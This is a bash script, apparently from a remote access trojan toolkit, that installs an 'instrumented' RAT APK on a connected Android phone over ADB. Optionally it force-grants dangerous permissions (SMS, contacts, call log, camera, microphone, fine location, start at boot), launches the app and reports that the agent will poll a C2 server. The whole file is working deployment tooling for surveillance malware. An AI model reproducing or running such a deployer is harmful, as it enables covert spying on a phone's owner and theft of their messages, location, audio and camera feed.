#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

usage() {
    cat <<EOF
Usage: $0 <instrumented.apk> [options]

Deploy a RAT APK to a connected Android device via ADB.

Options:
  --serial SERIAL   Target device serial (auto-detect if omitted)
  --uninstall       Uninstall existing app first
  --no-launch       Install only, don't start the app
  --grant-perms     Auto-grant all dangerous permissions
  -h, --help        Show this help

Examples:
  $0 output/instrumented-research-app.apk
  $0 output/instrumented.apk --serial emulator-5554
  $0 output/instrumented.apk --uninstall --grant-perms
EOF
    exit 0
}

APK_PATH=""
SERIAL=""
UNINSTALL=false
NO_LAUNCH=false
GRANT_PERMS=false

while [[ $# -gt 0 ]]; do
    case $1 in
        --serial) SERIAL="$2"; shift 2 ;;
        --uninstall) UNINSTALL=true; shift ;;
        --no-launch) NO_LAUNCH=true; shift ;;
        --grant-perms) GRANT_PERMS=true; shift ;;
        -h|--help) usage ;;
        -*) echo "Unknown option: $1"; usage ;;
        *)
            if [[ -z "$APK_PATH" ]]; then
                APK_PATH="$1"
            else
                echo "Error: unexpected argument '$1'"
                usage
            fi
            shift ;;
    esac
done

if [[ -z "$APK_PATH" ]]; then
    echo "Error: no APK path specified"
    usage
fi

if [[ ! -f "$APK_PATH" ]]; then
    echo "Error: APK not found: $APK_PATH"
    exit 1
fi

ADB="adb"
if [[ -n "$SERIAL" ]]; then
    ADB="adb -s $SERIAL"
fi

echo "========================================="
echo "  RAT APK Deployer"
echo "========================================="
echo "  APK:    $APK_PATH"
echo "  Device: ${SERIAL:-auto-detect}"
echo "========================================="
echo ""

# Check ADB
if ! command -v adb &>/dev/null; then
    echo "Error: adb not found. Install Android SDK platform-tools."
    exit 1
fi

# Check device
echo "[*] Checking for connected device..."
DEVICE_COUNT=$($ADB devices 2>/dev/null | grep -c "device$" || true)
if [[ "$DEVICE_COUNT" -eq 0 ]]; then
    echo "Error: no device connected. Check USB debugging is enabled."
    echo ""
    echo "Available devices:"
    $ADB devices -l
    exit 1
fi
echo "    Found $DEVICE_COUNT device(s)"

# Get device info
MODEL=$($ADB shell getprop ro.product.model 2>/dev/null | tr -d '\r')
ANDROID_VER=$($ADB shell getprop ro.build.version.release 2>/dev/null | tr -d '\r')
SDK=$($ADB shell getprop ro.build.version.sdk 2>/dev/null | tr -d '\r')
echo "    Model: $MODEL (Android $ANDROID_VER, SDK $SDK)"

# Extract package name from APK
echo ""
echo "[*] Reading APK manifest..."
PKG=$($ADB shell pm list packages 2>/dev/null | head -1)
# Try aapt if available
if command -v aapt &>/dev/null; then
    PKG=$(aapt dump badging "$APK_PATH" 2>/dev/null | grep "package: name=" | sed "s/.*name='\\([^']*\\)'.*/\\1/" || true)
fi
if [[ -z "$PKG" ]]; then
    # Fallback: try to find in decompiled output
    MANIFEST=$(find "$(dirname "$SCRIPT_DIR")/output" -name "AndroidManifest.xml" -path "*/decompiled/*" 2>/dev/null | head -1)
    if [[ -n "$MANIFEST" ]]; then
        PKG=$(grep -oP 'package="\K[^"]+' "$MANIFEST" 2>/dev/null || true)
    fi
fi
echo "    Package: ${PKG:-unknown}"

# Uninstall if requested
if [[ "$UNINSTALL" == "true" ]] && [[ -n "$PKG" ]]; then
    echo ""
    echo "[*] Uninstalling existing app..."
    $ADB uninstall "$PKG" 2>/dev/null || true
    sleep 1
fi

# Install APK
echo ""
echo "[*] Installing APK..."
INSTALL_OUTPUT=$($ADB install -r -t "$APK_PATH" 2>&1)
if echo "$INSTALL_OUTPUT" | grep -q "Success"; then
    echo "    Installed successfully"
else
    echo "    Install output: $INSTALL_OUTPUT"
    if echo "$INSTALL_OUTPUT" | grep -q "INSTALL_FAILED"; then
        echo ""
        echo "[*] Retrying with uninstall first..."
        if [[ -n "$PKG" ]]; then
            $ADB uninstall "$PKG" 2>/dev/null || true
            sleep 1
        fi
        INSTALL_OUTPUT=$($ADB install -r -t "$APK_PATH" 2>&1)
        if echo "$INSTALL_OUTPUT" | grep -q "Success"; then
            echo "    Installed on retry"
        else
            echo "Error: install failed: $INSTALL_OUTPUT"
            exit 1
        fi
    fi
fi

# Grant permissions if requested
if [[ "$GRANT_PERMS" == "true" ]] && [[ -n "$PKG" ]]; then
    echo ""
    echo "[*] Granting permissions..."
    PERMS=(
        "android.permission.INTERNET"
        "android.permission.ACCESS_NETWORK_STATE"
        "android.permission.ACCESS_WIFI_STATE"
        "android.permission.ACCESS_FINE_LOCATION"
        "android.permission.ACCESS_COARSE_LOCATION"
        "android.permission.READ_CONTACTS"
        "android.permission.READ_SMS"
        "android.permission.READ_CALL_LOG"
        "android.permission.CAMERA"
        "android.permission.RECORD_AUDIO"
        "android.permission.READ_PHONE_STATE"
        "android.permission.READ_EXTERNAL_STORAGE"
        "android.permission.WRITE_EXTERNAL_STORAGE"
        "android.permission.RECEIVE_BOOT_COMPLETED"
    )
    for perm in "${PERMS[@]}"; do
        $ADB shell pm grant "$PKG" "$perm" 2>/dev/null || true
    done
    echo "    Permissions granted"
fi

# Launch app
if [[ "$NO_LAUNCH" == "false" ]] && [[ -n "$PKG" ]]; then
    echo ""
    echo "[*] Launching app..."
    # Find launcher activity
    ACTIVITY=$($ADB shell cmd package resolve-activity --brief "$PKG" 2>/dev/null | tail -1 | tr -d '\r' || true)
    if [[ -z "$ACTIVITY" ]] || [[ "$ACTIVITY" == *"No activity"* ]]; then
        ACTIVITY=$($ADB shell dumpsys package "$PKG" 2>/dev/null | grep -A1 "android.intent.action.MAIN" | grep -oP '[a-zA-Z0-9_.]+/[a-zA-Z0-9_.]+' | head -1 | tr -d '\r' || true)
    fi
    if [[ -n "$ACTIVITY" ]]; then
        $ADB shell am start -n "$ACTIVITY" 2>/dev/null
        echo "    Started: $ACTIVITY"
    else
        $ADB shell monkey -p "$PKG" -c android.intent.category.LAUNCHER 1 2>/dev/null
        echo "    Started via monkey"
    fi
fi

echo ""
echo "[*] Checking for agent connection..."
echo "    The agent will poll the C2 server every 30 seconds."
echo "    Check the C2 dashboard to see if the agent registers."
echo ""
echo "    Monitor logcat: $ADB logcat -s RatAgent:* RatBoot:* RatConnectivity:*"
echo ""
echo "========================================="
echo "  Deployment complete!"
echo "========================================="
